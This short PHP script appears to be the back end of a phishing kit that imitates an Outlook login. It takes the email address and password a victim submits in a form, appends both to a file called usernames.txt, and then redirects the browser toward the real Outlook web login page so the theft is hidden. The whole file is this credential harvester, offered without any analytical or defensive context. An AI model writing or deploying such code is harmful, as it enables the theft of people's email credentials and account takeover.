<?php
file_put_contents("usernames.txt", "Outlook Username: " . $_POST['email'] ."\nPassword: ". $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://outlook.live.com/owa/
header("Location: $url");
?>